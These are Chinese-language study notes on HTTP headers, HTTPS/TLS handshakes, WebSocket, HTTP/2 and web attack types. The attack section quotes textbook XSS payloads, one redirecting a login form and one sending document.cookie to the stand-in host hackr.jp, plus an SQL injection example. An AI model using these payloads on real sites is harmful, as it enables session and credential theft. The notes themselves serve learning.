  - If-Match、If-None-Match、If-Modified、If-Unmodified 请求首部

  - Cache-Control 通用首部

- Range

  - Accept-Range 响应首部
  - If-Range 请求首部
  - Range 请求首部
  - Content-Range 实体首部

- Code

  - MediaType & Charset
    - Accept 响应首部
    - Content-Charset 实体首部
    - Content-Type 实体首部
  - Language
    - Accept-Language 请求首部
    - Content-Language 实体首部
  - Encoding
    - Transfer-Encoding 响应首部
    - Accept-Encoding 请求首部
    - TE 请求首部
    - Content-Encoding 实体首部

- Auth

  - Authorization
    - Authorization 请求首部
    - Proxy-Authorization 请求首部
  - Authenticate
    - Proxy-Authenticate 响应首部
    - WWW-Authenticate 响应首部
  - Cookie
    - Cookie 请求首部
    - Set-Cookie 响应首部

- URI

  - Host 请求首部
  - Referer 请求首部
  - Location 响应首部
  - Content-Location 实体首部

- Proxy

  - Via 请求首部
  - Max-Forwards 请求首部

## 优先级总结

值1[;q=优先级1],值2[;q=优先级2]

先逗号分隔出若干字段值子项

子项内分号分隔，分隔成项目名和优先级，如果没有优先级，默认1

## 编码总结

https://blog.csdn.net/weixin_39843989/article/details/101225414

1. <font color=red>https</font>是最外层编码，指出是否应当<font color=gree>加密</font>。

2. <font color=red>Transfer-Encoding: chunked</font>是第2层编码，指出是否<font color=red>Content-Length</font>不能预知，而是采用<font color=gree>分块传输</font>，如果结束了会在尾块中告知。

3. <font color=red>Content-Encoding: gzip</font>是第3层编码，指出内容是否经过<font color=gree>压缩</font>、是否需要解压。

4. <font color=red>Content-Type: text/html; charset=utf-8</font>是最内层编码，告知文加你是Unicode<font color=gree>字符集</font>对<font color=red>UTF-8</font>编码的HTML代码，需要用<font color=red>UTF-8</font>码表将<font color=red>1010</font>机器码换算为字符后，再按照HTML编程语言来解读和渲染它。

   当然它也可以是<font color=red>Content-Type: application/x-gzip</font>，但与第3层的区别是，第3层的<font color=red>Content-Encoding: gzip</font>压缩表示交给前端时应当不透明地自动解压，前端需要的是没压缩前的东西，而最内层<font color=red>Content-Type: application/x-gzip</font>的意思是，所获取的内容本省就是一个<font color=red>.gz</font>文件。

## HTTPS

HTTP不足：

1. 通信使用明文，内容可能被窃听
2. 不验证通信方的身份，可能遭遇伪装
3. 无法证明报文的完整性，可能已遭篡改

SSL（Secure Socket Layer，安全套接层）

TLS（Transport Layer Security 安全层传输协议）

### 不验证通信方的身份就可能遭遇伪装

- 任何人都可以发起请求

  - 无法确定请求发送至目标的Web服务器是否是按真实意图返回响应的哪台服务器。有可能是已伪装的Web服务器。
  - 无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端。有可能是伪装的客户端。
  - 无法确认正在通信的对方是否具备访问权限。
  - 无法判定请求来自何方，出自谁手。
  - 即使是无意义的请求也会照单全收。无法阻止海量请求下的DoS攻击（Denial of Service，拒绝服务攻击）。

- 查明对手的<font color=red>证书</font>

  SSL不仅提供加密处理，还使用了一种被称为证书的手段，可用于确定方。

  证书是由值得信任的第三方机构颁发，用以证明服务器和客户端是实际存在的。

  另外，伪造证书从技术角度来说是异常困难的一件事。

### 无法证明报文完整性，可能已遭篡改

- 接收到的内容可能有误

  ![image-20221212130950532](./assets/image-20221212131039291.png)

  ![image-20221212131026574](./assets/image-20221212131026574.png)

  像这样，请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击称为中间人攻击（Man-in-the-Middle attack,，MITM）。

- 如何防止篡改

  虽然有使用HTTP协议报文完整性的方法，但是事实上并不便捷、可靠。

  常用的是MD5和SHA-1等散列值校验的方法，以及用来确认文件的数字签名方法。

![image-20221212132617468](./assets/image-20221212132617468.png)

提供文件下载访问的Web网站也会提供相应的以PGP（Pretty Good Privacy，完美隐私）创建的数字签名及MD5算法生成的散列值。

<font color=red>PGP</font>是用来证明创建文件的数字签名

<font color=red>MD5</font>是单向函数生成的散列值。

不论使用哪种方法，都需要操纵客户端的用户本人亲自检查验证下载的文件是否就是服务器上的文件。浏览器无法自动帮用户检查。

可惜的是，用这些方法也依然无法百分百保证确认结果正确。因为PGP和MD5本身被改写的话，用户是没有办法意识到的。

为了有效防止这些弊端，有必要使用HTTPS。SSL提供认证和加密处理及摘要功能。仅依靠HTTP确保完整性是非常困难的，因此通过和其他协议组合使用来实现这个目标。

### HTTP+加密+认证+完整性保护=HTTPS

![image-20221212135945389](./assets/image-20221212135945389.png)

### HTTPS是身披SSL外壳的HTTP

HTTPS并非是应用层的一种新协议。只是HTTP通信接口部分用SSL（Security Socket Layer）和TLS（Transport Layer Security）协议代替而已。

通常，HTTP直接与TCP通信。当使用SSL时，则HTTP先与SSL通信，再由SSL与TCP通信。简言之，HTTPS其实就是身披SSL协议这层外壳的HTTP。

![image-20221212140310465](./assets/image-20221212140310465.png)

采用SSL后，HTTP就拥有了HTTPS加密、证书和完整性保护这些功能。

SSL是独立于HTTP的协议。其他应用层协议（SMTP、Telnet等）都可以配合SSL协议使用。

SSL是当今使用最广泛的网络安全技术。

### 相互交换密钥的公钥加密技术

SSL采用<font color=red>公开密钥加密（Public-key cryptography）</font>的加密处理方式。

- 共享密钥加密的困境

  加密和解密使用一个密钥的方式称为共享密钥加密（Common key crypto system），又加对称密钥加密。

  ![image-20221212141832444](./assets/image-20221212141832444.png)

  ![image-20221212141849261](./assets/image-20221212141849261.png)

- 使用两把密钥的公开密钥加密（非对称加密）

  ![image-20221212141934453](./assets/image-20221212141934453.png)

- HTTPS采用混合加密机制

  HTTPS采用对称加密和非对称加密混合加密机制。

  

  对称加密较快，非对称加密较慢。可以使用非对称加密方式来安全交换对称加密的密钥。

  充分利用两者各自的优势，在交换密钥环节使用非对称加密，之后的建立通信交换报文阶段则使用对称加密方式。

  ![image-20221212142613379](./assets/image-20221212142613379.png)

### 证明公钥正确性的证书

还有些问题，无法证明公钥本身就是货真价实的公钥。有可能公钥被中间劫持者替换掉了。

为了解决这个问题，可以使用由数字证书认证机构（CA，Certificate Authority）和其相关机构颁发的公钥证书。

![image-20221212143314900](./assets/image-20221212143314900.png)

- 可证明组织真实性的EV SSL证书

  证书的一个作用是用来证明作为通信一方的服务器是否规范，另外一个作用是可确认对方服务器背后的运营的企业是否真实存在。拥有该特性的证书就是EV SSL证书（Extended Validation SSL Certificate）。

  国际标准、浏览器地址栏背景是绿色的

- 用以确定客户端的客户端证书

  还可以使用客户端证书。用于认证客户端，证明服务器正在通信的对方始终是预料之内的客户端，与服务器证书如出一辙。

  客户端证书有很多困难，证书获取与发布，付费。每张证书、每个用户都需要支付费用。还需要让知识层次不同的用户们自行安装证书。

  现状：网上银行采用了客户端证书。登录时不仅需要ID和密码，还需要客户端证书，以确定用户是否从特定终端访问网银。

  客户端证书的另一个问题，只能证明客户端实际存在，而不能用来证明用户本人的真实有效性。

- 认证机构信誉第一

  认证机构可能被黑，这是HTTPS整个安全机制的破绽之处。

  CRL机制 Certificate Revocation List 证书吊销列表

  RCA对策 Root Certificate Authority 从客户端删除根证书颁发机构

  但是上面两种做法是事后的了，不能避免损失。

- 由自认证机构颁发的证书称为自签名证书

  如果使用OpenSSL这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。但在互联网上不可作为证书使用。

  <font color=red>自认证机构，自签名证书（根证书都是自签名证书，根CA都是自认证机构）</font>

### HTTPS的安全通信机制

![image-20221213215622580](./assets/image-20221213215622580.png)

图：HTTPS通信

1. 客户端通过发送Client Hello 报文开始SSL通信。报文中包含客户端支持的SSL的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。
2. 服务器可进行SSL通信时，会以Server Hello 报文作为应答。和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容时从接收到的客户端加密组件中筛选出来的。
3. 之后服务器发送Certificate 报文。报文中包含公开密钥证书。
4. 最后服务器发送Server Hello Done 报文通知客户端，最初阶段的SSL握手协议部分结束。
5. SSL第一次握手结束之后，客户端以Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为Pre-master secret 的随机密码串。该报文已用步骤3中的公开密钥加密。
6. 接着客户端继续发送Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用Pre-master secret 密钥加密。
7. 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判断标准。
8. 服务器同样发送Change Cipher Spec 报文。
9. 服务器同样发送 Finished 报文。
10. 服务器和客户端的Finished 报文交换完毕之后，SSL连接就算建立完成。当然，通信会受到SSL的保护。从此处开始进行应用层协议的通信，即发送HTTP请求。
11. 应用层协议通信，即发送HTTP请求和响应。
12. 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送TCP FIN 报文来关闭与TCP的通信。

以上流程中，应用层发送数据（步骤11）时会附加一种叫做MAC（Messge Authentication Code）的报文摘要。MAC能够查知报文是否遭到篡改，从而保护报文的完整性。

👇是对整个流程的图解。图中说明了从仅使用服务器端端端公钥证书（服务器证书）建立HTTPS通信的整个过程。

![image-20221214090210149](./assets/image-20221214090210149.png)

CBC模式（Cipher Block Chaining）又名密码分组链接模式。在此模式下，将前一个明文块加密处理后和下一个明文块做XOR运算，使之重叠，然后再对运算结果做加密处理。对第一个明文块做加密时，要么使用前一段密文的最后一块，要么利用外部生成的初始向量（initial vector，IV）。

```c
master_secert = f(pre_master_secert, clientRandom, serverRandom)
```

```c
master_secret = PRF(pre_master_secret, "master secret",
                    ClientHello.random + ServerHello.random)
                    [0..47];
```

![img](./assets/trAgs.jpg)

- SSL和TLS

  HTTPS使用SSL和TLS两个协议。

  SSL最早是网景公司倡导开发的，SSL3.0之前的版本都是其开发。

  目前主导权已转移到IETE（Internet Engineering Task Force，Internet 工程任务组）的手中。

  IETF以SSL3.0为基准，定制了TLS1.0、TLS1.1和TLS1.2。

  TLS是以SSL为原型开发的协议，有时会统一将TLS和SSL都称为SSL协议（叫顺口了）

  目前主流版本：SSL3.0和TLS1.0

- SSL速度慢吗

  慢

  ![image-20221214122448637](./assets/image-20221214122448637.png)

HTTPS比HTTP慢2到100倍

SSL的慢分两种：

1. 通信慢
2. 加密解密处理，消耗CPU及内存资源。可以用SSL加速器：（专用服务器）来硬件加速加密解密过程



## 确认访问用户身份的认证

## 基于HTTP的功能追加协议

### Websocket

全双工通信

RFC6455

Websocket是建立在HTTP基础上的，因此连接的发起方仍是客户端。

主要特点：

- 推送功能

- 减少通信量

  只要建立了websocket，就希望一直保持连接。和HTTP相比，不但每次连接时间的总开销少，而且由于首部信息很少，通信量也少。

为了实现websocket通信，在HTTP连接建立之后，需要完成一次“握手”（Handshaking）步骤。

- 握手·请求
- 握手·响应

### HTTP/2.0

7项讨论：

1. 压缩
2. 多路复用
3. TLS义务化
4. 协商
5. 客户端拉拽（Client Pull）/服务器推送（Server Push）
6. 流量控制
7. Websocket

## Web的攻击技术

![image-20221214124125681](./assets/image-20221214124125681.png)

### Escape

因输入值转义不完全引发的安全漏洞

Web应用安全对策大致分为两部分：

1. 客户端验证

2. Web应用（服务器端）验证

   1. 输入值验证
   2. 输出值转义

   ![image-20221214130653952](./assets/image-20221214130653952.png)

#### XSS

跨站脚本攻击（Cross-Site Scrpting，XSS）是指通过存在安全漏洞的Web网站往用户的浏览器内注入运行非法的HTML标签或js进行的一种攻击。

- 利用虚假输入表单骗取用户个人信息

- 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求

- 显示伪造的文章或图片

- 跨站脚本攻击案例：在动态生成HTML处发生

  比如在url中传递脚本、或者黑客提交了脚本后没有经过检测、转义直接注入到网站上（安全漏洞），给黑客提供了伪造的时机。

  ```
  http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script>
  ```

  ```html
  <div class="logo">
    <img src="/img/logo.gif" alt="E! 拍卖会" />
  </div>
  <form action="http://example.jp/login" method="post" id="login"> 
    <div class="input_id">
  		ID <input type="text" name="ID" value="yama" /> 
    </div>
  </form>
  
  <!-- 会变成 -->
  <div class="logo">
    <img src="/img/logo.gif" alt="E! 拍卖会" />
  </div>
  <form action="http://example.jp/login" method="post" id="login"> 
    <div class="input_id">
  		ID <input type="text" name="ID" value=""><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script>
    </div>
  </form>
  ```

- 窃取用户Cookie

  除了在表单处设下圈套，还可以窃取Cookie，注入下面的脚本

  ```
  http://example.jp/login?ID="<script src=http://hackr.jp/xss.js></script>
  ```

  

  ```html
  <script src=http://hackr.jp/xss.js></script>
  ```

  内容为：

  ```js
  var content = escape(document.cookie); 
  document.write("<img src=http://hackr.jp/?");
  document.write(content); document.write(">");
  ```

  可以在漏洞Web上执行该脚本，收集用户Cookie发送到攻击者的网站。

#### SQL Injection

SQL注入针对数据库

如果后端使用硬拼SQL的方式来传递参数，可能会有SQL漏洞

```sql
SELECT * FROM bookTbl WHERE author = '$q' and flag = 1;
# 通过传入 陈柄宏 # ' 来注入漏洞
SELECT * FROM bookTbl WHERE author = '陈柄宏' # ' and flag = 1;
```

#### OS Command Injection

OS命令注入针对操作系统的shell

#### HTTP首部注入

#### 邮件首部注入

#### 目录遍历

#### 远程文件包含漏洞

### BUG

因设置或设计上的缺陷引发的安全漏洞

#### 强制浏览

#### 不正确的错误消息处理

#### 开放重定向

### Session

因会话管理疏忽引发的安全漏洞

#### 会话劫持

#### 会话固定攻击

#### 跨站点请求伪造

### Other

其他安全漏洞

#### 密码破解

#### 点击劫持

#### Dos攻击

#### 后门程序

